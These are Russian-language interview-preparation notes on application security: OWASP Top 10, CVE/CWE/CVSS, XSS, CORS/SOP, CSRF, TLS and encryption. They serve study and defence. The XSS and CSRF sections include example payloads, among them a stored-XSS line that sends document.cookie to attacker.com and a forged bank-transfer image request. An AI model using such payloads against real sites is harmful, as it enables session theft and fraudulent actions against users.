# Common questions

Created: May 30, 2025 8:38 PM

| `Расскажите о себе, о своем опыте, мотивации. В чем выражается интерес к сфере наступательной безопасности?` | Меня зовут Даниил, мне 22 года, на данный момент примерно 4 года работаю Java Software Engineer-ом, и питаю страсть к безопасности уже не первый год, мечтаю и стремлюсь шифтануть свою карьеру в Security, применяя уже имеющиеся навыки. Начну с того, что окончил специальность “компьютерная безопасность” факультета радиофизики БГУ. Не знаю как в других вузах, у меня это было 4 года хардкорной математики, физики и hardware-а, и на 4 курсе мы немного потрогали Kali Linux, что меня, конечно расстраивало. Но я человек целеустремленный, я закончил вуз и стал прокачиваться в security уже самостоятельно. И вот я, собственно, уже больше года активно изучаю кибербезопасность, с упором на Web и AppSec. Уже успел получить пару сертификатов, постоянно практикуюсь в академиях и CTFах. Как написано в моем гитхаб профиле, I’m a person who loves building and hacking stuff, так вот я считаю что я был бы очень счастлив совместить свои интересы в классической проге и КБ, это моя мотивация. |
| --- | --- |
| `Расскажите о любимых OWASP Top 10 Уязвимостях` | 1. Broken Access Control
2. Cryptographic Failures
3. Injections
4. Insecure Design
5. Security Misconfigurations
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

Любимые — BAC и Injections. BAC потому что такие уязвимости очень коварные и не так просто детектятся, это своего рода золотая жила для исследователей, ну а Injections это вечная классика, очень обширные возможности по эксплуатации при достаточно тривиальном подходе к обнаружению, ну наверное невозможно будучи пентестером или аппсеком не любить инъекции. |
|  |  |

### `CVE vs CWE cs CVSS`

### **CVE (Common Vulnerabilities and Exposures)**

- **Что это?** Уникальный идентификатор (**ID**) для конкретной уязвимости в ПО/системе.
- **Цель:** Каталогизировать **известные уязвимости** (например, CVE-2021-44228 — Log4Shell).
- **Характеристики:**
    - Привязан к конкретному продукту/версии.
    - Имеет оценку критичности (**CVSS**).
    - Описывает **реализованную угрозу**, которую можно эксплуатировать.

### **CWE (Common Weakness Enumeration)**

- **Что это?** Система классификации **типовых ошибок/слабых мест** в коде/дизайне.
- **Цель:** Описывать **причины уязвимостей** на абстрактном уровне (например, CWE-89 — SQL-инъекция).
- **Характеристики:**
    - Не привязан к конкретному продукту.
    - Это **шаблон** для ошибок, которые могут привести к уязвимостям.
    - Помогает в профилактике (например, при код-ревью).

### **Ключевое отличие**

- **CVE** — это "болезнь" (конкретная уязвимость), а **CWE** — "диагноз" (причина болезни).
- Пример:
    - Уязвимость **CVE-2023-1234** в веб-приложении возникает из-за **CWE-79** (XSS).

### **Почему важно в AppSec?**

- **CVE** помогает отслеживать и исправлять известные уязвимости.
- **CWE** позволяет предотвращать ошибки на этапе разработки (например, через обучение, статический анализ).

---

**Дополнительно для собеседования:**

- Упомяни, что **CWE** используется в таких инструментах, как OWASP Top 10, а **CVE** — в сканерах уязвимостей (Nessus, Qualys).

### **CVSS (Common Vulnerability Scoring System)**

**Что это?**

— Стандартизированная система оценки **серьезности уязвимостей** (от 0.0 до 10.0).

— Используется для **приоритизации** исправлений (например, `CVSS 9.8` → критично, нужно патчить срочно).

---

### **Базовая метрика CVSS (v3.1)**

Оценивает **постоянные** характеристики уязвимости:

1. **Exploitability (Как эксплуатируется?)**
    - `Attack Vector` (Сетевой/локальный/физический доступ).
    - `Attack Complexity` (Нужны ли спецусловия?).
    - `Privileges Required` (Нужны ли права пользователя?).
    - `User Interaction` (Требуется ли действие жертвы?).
2. **Impact (Последствия успешной атаки):**
    - `Confidentiality` (Утечка данных).
    - `Integrity` (Изменение данных).
    - `Availability` (DoS, отказ службы).

**Пример:**

Уязвимость с `CVSS 9.8` (критичная) — обычно это удаленная эксплуатация без аутентификации с полным компромиссом системы (например, Log4Shell).

---

### **Temporal/Environmental метрики**

— **Temporal**: Меняются со временем (есть ли эксплойт в публичном доступе? Есть ли патч?).

— **Environmental**: Учитывает контекст компании (насколько критична система для бизнеса?).

---

### **Как CVSS связан с CVE и CWE?**

1. **CVE + CVSS**:
    
    — Каждому **CVE** присваивается **CVSS-оценка** (например, в NVD — National Vulnerability Database).
    
    — Помогает ответить: *"Насколько опасен этот CVE для нас?"*
    
2. **CWE + CVSS**:
    
    — Уязвимости с определенными **CWE** (например, `CWE-119` — Buffer Overflow) часто получают высокий CVSS из-за тяжелых последствий.
    
    — Пример: Большинство RCE-уязвимостей (Remote Code Execution) имеют CVSS ≥ 9.0.
    

---

### **Почему важно в AppSec?**

1. **Приоритизация угроз**:
    
    — Патчим сначала `CVSS 9.8`, потом `CVSS 5.0`.
    
2. **Коммуникация с руководством**:
    
    — *"Этот CVE критичен (9.8), потому что позволяет хакеру получить контроль над сервером без пароля"*.
    
3. **Профилактика**:
    
    — Анализ **CWE** с высоким CVSS помогает усилить защиту (например, учить разработчиков избегать `CWE-89` — SQL-инъекций).
    

`XXS. Классификация, Потенциальный урон. Mitigation — Sanitize / Validation, CSP, WAF`

## **XSS (Cross-Site Scripting)**

**Определение:**

Уязвимость, позволяющая злоумышленнику внедрить вредоносный JavaScript-код в страницу, который выполняется в браузере жертвы.

---

### **1. Классификация XSS**

### **1.1. Reflected XSS (Отраженная)**

- **Как работает:**
    - Злоумышленник подставляет скрипт в URL/параметры запроса → сервер "отражает" его в ответе без санитайза.
    - Жертва открывает специально сформированную ссылку.
- **Пример:**
- `https://example.com/search?query=<script>alert(1)</script>`
    - Сервер возвращает: `"Результаты поиска: <script>alert(1)</script>"`.

### **1.2. Stored XSS (Хранимая)**

- **Как работает:**
    - Скрипт сохраняется на сервере (например, в комментариях, профиле пользователя) и выполняется у всех, кто открывает страницу.
- **Пример:**
- `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>`
    - Постится в комментарии → выполняется у каждого посетителя.

### **1.3. DOM-based XSS**

- **Как работает:**
    - Клиентский JavaScript динамически изменяет DOM, используя недоверенные данные (например, `document.location.hash`).
    - **Сервер не участвует** — вся обработка на стороне клиента.
- **Пример:**

`// Код на сайте: 
document.write("<h1>" + location.hash.slice(1) + "</h1>");`

- Атака:
- `https://example.com/#<img src=x onerror=alert(1)>`

---

### **2. Потенциальный урон**

- **Кража данных:**
    - Куки сессии (`document.cookie`), токены, персональные данные.
- **Фишинг:**
    - Подмена интерфейса (например, формы ввода пароля).
- **Распространение вредоносного ПО:**
    - Загрузка эксплойтов через `<script src="malicious.js">`.
- **Дефейс сайта:**
    - Изменение контента страницы.

---

### **3. Методы защиты (Mitigation)**

### **3.1. Sanitize / Validation**

- **Экранирование (HTML Encoding):**
    - Замена опасных символов (`<`, `>`, `&`, `"`, `'`) на HTML-сущности (`&lt;`, `&gt;` и т.д.).
    - Библиотеки:
        - Для JS: `DOMPurify`.
        - Для PHP: `htmlspecialchars()`.
- **Валидация входных данных:**
    - Разрешать только ожидаемые форматы (например, цифры в `user_id`).

### **3.2. Content Security Policy (CSP)**

- **Как работает:**
    - HTTP-заголовок, ограничивающий источники скриптов, стилей и других ресурсов.
- **Пример:**
- `Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;`
    - Блокирует inline-скрипты (`<script>alert(1)</script>`) и внешние JS с недоверенных доменов.

### **3.3. Web Application Firewall (WAF)**

- **Фильтрация вредоносных запросов:**
    - Блокирует payloads типа `<script>`, `onerror=`, `javascript:`.
- **Примеры:**
    - Cloudflare WAF, ModSecurity.
- **Важно:** WAF — это **дополнительная** защита, а не замена санитайзу!

### **3.4. Другие методы**

- **HttpOnly и Secure флаги для кук:**
    - Запрещает доступ к кукам через JavaScript (`document.cookie`).
- **Использование современных фреймворков:**
    - React/Angular/Vue автоматически экранируют данные (но DOM-based XSS возможен).

### **`CORS и SOP`**

**Короткий ответ:**

**SOP (Same-Origin Policy)** — это ограничение браузера, запрещающее скриптам с одного домена получать доступ к данным другого.

**CORS (Cross-Origin Resource Sharing)** — механизм, который **ослабляет** SOP, позволяя безопасно разрешать кросс-доменные запросы.

---

## **1. SOP (Same-Origin Policy)**

### **Что это?**

Браузерная политика безопасности, которая **блокирует** JavaScript-запросы к ресурсам с другого домена (если явно не разрешено).

### **Как определяется "одинаковый" origin?**

Два URL считаются одного origin, если совпадают:

- **Протокол** (`http`/`https`)
- **Домен** (`example.com`)
- **Порт** (`:80`, `:443`)

**Пример:**

- `https://example.com` и `https://api.example.com` — **разные** origin (разные поддомены).
- `http://example.com` и `https://example.com` — **разные** origin (разные протоколы).

### **Что блокирует SOP?**

- Запросы `fetch`, `XMLHttpRequest` к другому домену.
- Доступ к содержимому `<iframe>` с другого origin (если нет CORS).

### **Исключения (SOP не блокирует):**

- Загрузка CSS, картинок, скриптов с других доменов (но JavaScript не получит доступ к их содержимому).
- Некоторые HTML-теги, например `<img>`, `<script>`.

---

## **2. CORS (Cross-Origin Resource Sharing)**

### **Что это?**

Механизм, который **разрешает** кросс-доменные запросы, если сервер явно указывает, какие домены могут обращаться к его ресурсам.

### **Как работает?**

1. **Браузер** перед отправкой основного запроса (например, `POST` или `PUT`) отправляет **preflight-запрос** (`OPTIONS`).
2. **Сервер** отвечает заголовками, указывающими, разрешён ли запрос:
    - `Access-Control-Allow-Origin: https://example.com` (или  для любых доменов).
    - `Access-Control-Allow-Methods: GET, POST, PUT`.
    - `Access-Control-Allow-Headers: Content-Type, Authorization`.
3. Если preflight успешен, браузер отправляет основной запрос.

### **Типы CORS-запросов:**

| Тип запроса | Когда используется? | Пример |
| --- | --- | --- |
| **Простой (Simple Request)** | GET/POST с разрешёнными заголовками | `fetch('https://api.com/data')` |
| **Preflight Request** | "Небезопасные" методы (PUT, DELETE) или кастомные заголовки | `fetch('https://api.com/data', { method: 'PUT' })` |
| **Запрос с учётными данными (Credentials)** | Если нужны куки/авторизация | `fetch('https://api.com/data', { credentials: 'include' })` |

### **Важные CORS-заголовки:**

| Заголовок | Описание | Пример |
| --- | --- | --- |
| `Access-Control-Allow-Origin` | Разрешает определённые домены (или `*`) | `Access-Control-Allow-Origin: https://example.com` |
| `Access-Control-Allow-Methods` | Разрешённые HTTP-методы | `Access-Control-Allow-Methods: GET, POST, OPTIONS` |
| `Access-Control-Allow-Headers` | Разрешённые заголовки запроса | `Access-Control-Allow-Headers: Content-Type, X-API-Key` |
| `Access-Control-Allow-Credentials` | Разрешает отправку кук/авторизации | `Access-Control-Allow-Credentials: true` |

---

## **3. Разница между SOP и CORS**

| **Критерий** | **SOP** | **CORS** |
| --- | --- | --- |
| **Цель** | Блокировать кросс-доменные запросы | Разрешать кросс-доменные запросы **безопасно** |
| **Кто применяет?** | Браузер | Браузер + сервер (через заголовки) |
| **Можно ли обойти?** | Нет (без уязвимостей) | Да, если сервер неправильно настроен (`Access-Control-Allow-Origin: *`) |

---

## **4. Уязвимости и безопасность**

### **Ошибки в CORS, ведущие к уязвимостям:**

- `Access-Control-Allow-Origin: *` + `Access-Control-Allow-Credentials: true` → утечка данных.
- Некорректная валидация `Origin` → подделка запросов (например, разрешение `.attacker.com`).

### **Как защититься?**

- **Сервер:**
    - Точно указывать `Access-Control-Allow-Origin` (не  для запросов с учётными данными).
    - Ограничивать методы (`Access-Control-Allow-Methods`).
- **Клиент:**
    - Не отправлять чувствительные данные, если `Access-Control-Allow-Origin: *`.

---

### **`Может ли Same-Origin Policy (SOP) защитить от CSRF?`**

**Короткий ответ:**

**Нет, SOP сама по себе не защищает от CSRF**, но некоторые её аспекты могут *ограничивать* отдельные атаки. CSRF требует дополнительных мер защиты (например, CSRF-токены).

---

## **1. Почему SOP ≠ Защита от CSRF?**

### **CSRF (Cross-Site Request Forgery)**

— Атака, где жертва **непроизвольно** отправляет запрос к доверенному сайту (например, перевод денег через авторизованную сессию).

— Пример:

html

`<!-- Сайт злоумышленника -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">`

Если жертва авторизована в `bank.com`, браузер отправит запрос **с её куками**.

### **Как ведёт себя SOP в этом сценарии?**

1. **SOP разрешает отправку запросов** (GET/POST) на другие домены, даже если ответ не может быть прочитан.
    - Запросы с `<form>`, `<img>`, `<script>` **не блокируются** SOP.
2. **SOP блокирует только чтение ответа** от другого origin.
    - В CSRF атакующему не нужно читать ответ — важен сам факт выполнения запроса.

**Итог:**

- SOP не мешает отправке запроса с куками жертвы.
- CSRF-эксплойты работают, даже если SOP активна.

**`Разница между HTTP и HTTPS`** 

![image.png](Common%20questions/image.png)

## **2. Как работает HTTPS?**

HTTPS = **HTTP + TLS/SSL** (Transport Layer Security / Secure Sockets Layer).

### **Этапы установки HTTPS-соединения (TLS Handshake)**

1. **Клиент** (браузер) запрашивает HTTPS-соединение (`ClientHello`).
2. **Сервер** отправляет SSL-сертификат (`ServerHello`).
3. **Клиент** проверяет сертификат (доверенный ли CA, не истёк ли срок).
4. **Генерация ключей**:
    - Клиент и сервер согласовывают **сессионный ключ** (симметричное шифрование).
5. **Шифрованный обмен данными** (AES, ChaCha20).

---

## **3. Почему HTTPS важен для безопасности?**

### **1. Защита от атак**

- **MITM (Man-in-the-Middle)** — без HTTPS злоумышленник может читать и изменять трафик.
- **Сниффинг** — перехват паролей, кук, банковских данных.
- **Подмена страниц (DNS Spoofing)** — HTTPS гарантирует, что сайт настоящий (проверка сертификата).

### **2. Целостность данных**

- TLS предотвращает изменение данных в пути (например, внедрение вирусов в загружаемые файлы).

### **3. Аутентификация**

- SSL-сертификат подтверждает, что вы подключены к настоящему сайту, а не к фишинговому.

---

## **4. Практическое применение в AppSec**

### **Уязвимости, связанные с HTTP**

- Перехват сессионных кук (`Cookie Hijacking`).
- Кража логинов/паролей через публичные Wi-Fi.
- Внедрение вредоносного JS (например, через прокси-атаки).

### **Как внедрить HTTPS?**

1. **Получить SSL-сертификат** (бесплатно: Let's Encrypt, платно: DigiCert).
2. **Настроить веб-сервер** (Nginx/Apache) на использование HTTPS.
3. **Принудительно перенаправлять HTTP → HTTPS** (HSTS).
4. **Проверить настройки TLS** (отключить SSLv3, слабые шифры).

---

### **`SSL/TLS Handshake: пошаговое объяснение`**

**Короткий ответ:**

SSL/TLS
 Handshake — это процесс установки безопасного соединения между клиентом
 и сервером. Он включает аутентификацию сервера, согласование алгоритмов
 шифрования и генерацию общих ключей.

---

## **1. Зачем нужен SSL Handshake?**

- **Шифрование данных** (чтобы их нельзя было прочитать при перехвате).
- **Аутентификация сервера** (клиент проверяет, что сервер — настоящий).
- **Согласование криптографических алгоритмов** (какой шифр использовать).

---

## **2. Этапы TLS Handshake (на примере TLS 1.2)**

### **Шаг 1: ClientHello**

Клиент (браузер) отправляет серверу:

- Поддерживаемые версии TLS (например, TLS 1.2, TLS 1.3).
- Список **шифров** (например, `AES256-GCM-SHA384`).
- **Случайное число** (Client Random), которое позже используется для генерации ключа.

### **Шаг 2: ServerHello**

Сервер отвечает:

- Выбранная версия TLS (например, `TLS 1.2`).
- Выбранный **шифр** (например, `AES256-GCM-SHA384`).
- **Случайное число** (Server Random).
- **SSL-сертификат** (чтобы клиент мог проверить подлинность сервера).

### **Шаг 3: Проверка сертификата**

Клиент проверяет:

1. **Доверен ли центр сертификации (CA)** (например, Let's Encrypt, DigiCert).
2. **Не истёк ли срок действия** сертификата.
3. **Соответствует ли домен** в сертификате запрошенному сайту.

→ Если проверка не пройдена, браузер покажет предупреждение (`ERR_CERT_AUTHORITY_INVALID`).

### **Шаг 4: Обмен ключами (Key Exchange)**

- Клиент генерирует **Pre-Master Secret**, шифрует его открытым ключом из сертификата и отправляет серверу.
- Сервер расшифровывает его своим **приватным ключом**.
- Обе стороны на основе **Client Random, Server Random и Pre-Master Secret** вычисляют **Master Secret** → из него получают **сессионные ключи** для шифрования.

### **Шаг 5: Готово к шифрованию (Finished)**

- Клиент и сервер отправляют друг другу сообщение **Finished**, зашифрованное новыми ключами.
- Если расшифровка успешна, соединение установлено.

### **`Симметричное vs. Асимметричное шифрование`**

**Короткий ответ:**

- **Симметричное** — один ключ для шифрования и расшифровки (**быстро**, но сложно обмениваться ключами).
- **Асимметричное** — пара ключей (публичный + приватный) (**безопасный обмен**, но медленно).

---

## **1. Основные различия**

| **Критерий** | **Симметричное шифрование** | **Асимметричное шифрование** |
| --- | --- | --- |
| **Ключи** | Один общий ключ | Пара: публичный + приватный |
| **Скорость** | ⚡ Быстро (подходит для больших данных) | 🐢 Медленно (в 100–1000 раз медленнее) |
| **Безопасность обмена ключами** | Сложно передать ключ безопасно | Публичный ключ можно свободно распространять |
| **Использование** | Шифрование данных (AES, ChaCha20) | Обмен ключами, цифровые подписи (RSA, ECC) |
| **Примеры алгоритмов** | AES-256, DES (устарел), Blowfish | RSA, ECC (Elliptic Curve), DH (Diffie-Hellman) |

---

## **2. Подробное сравнение**

### **Симметричное шифрование**

- **Как работает:**
    - Один и тот же ключ шифрует и расшифровывает данные.
    - Пример:
        
        python
        
- `encrypted = AES_encrypt(data, key="secret123")
decrypted = AES_decrypt(encrypted, key="secret123")`
- **Плюсы:**
    - Высокая скорость (используется для шифрования файлов, HTTPS-трафика).
    - Энергоэффективно (подходит для IoT-устройств).
- **Минусы:**
    - Проблема безопасной передачи ключа (**Key Distribution Problem**).
    - Если ключ украден, вся система скомпрометирована.

### **Асимметричное шифрование**

- **Как работает:**
    - Публичный ключ шифрует, приватный — расшифровывает (и наоборот для подписей).
    - Пример:
        
        python
        
- 
    - `encrypted = RSA_encrypt(data, public_key)
    decrypted = RSA_decrypt(encrypted, private_key)`
- **Плюсы:**
    - Решает проблему обмена ключами (публичный ключ можно передавать открыто).
    - Позволяет создавать **цифровые подписи** (проверка авторства).
- **Минусы:**
    - Медленное (не подходит для шифрования больших объёмов данных).
    - Требует больше вычислительных ресурсов.

---

## **3. Где применяется?**

### **Симметричное**

- **HTTPS** (шифрование трафика после TLS Handshake).
- **Шифрование дисков** (BitLocker, VeraCrypt).
- **Мессенджеры** (Signal, Telegram MTProto).

### **Асимметричное**

- **TLS Handshake** (обмен симметричными ключами через RSA/ECDH).
- **PGP/GPG** (шифрование email).
- **Блокчейн** (цифровые подписи транзакций).

---

## **4. Комбинированное использование**

На практике оба типа шифрования **используются вместе**:

1. **Асимметричное** — для безопасной передачи симметричного ключа (например, в TLS).
2. **Симметричное** — для шифрования основного трафика (AES-256).

**Пример (HTTPS):**

- Клиент и сервер используют **RSA/ECDH** (асимметричное) для обмена **сессионным ключом**.
- Далее весь трафик шифруется **AES-GCM** (симметричное).

---

`Source, Sink & Gadget (XSS)`

### **Source, Sink и Gadget в контексте XSS**

Эти термины используются для анализа и эксплуатации XSS (Cross-Site Scripting). Они помогают понять:

- **Откуда берутся вредоносные данные (Source)**.
- **Где они выполняются как код (Sink)**.
- **Как их передать между Source и Sink (Gadget)**.

### **Что такое Gadget в контексте XSS?**

**Простыми словами:**

Gadget — это «мостик», который помогает злоумышленнику **передать вредоносные данные** (Source) в опасную функцию (Sink), обходя защиту.

---

### **Аналогия из жизни**

Представьте:

- **Source** — яд (вредоносный код).
- **Sink** — рот жертвы (место, где яд подействует).
- **Gadget** — ложка, которой злоумышленник подносит яд ко рту.

Без ложки (Gadget) яд останется в чашке (Source) и не навредит.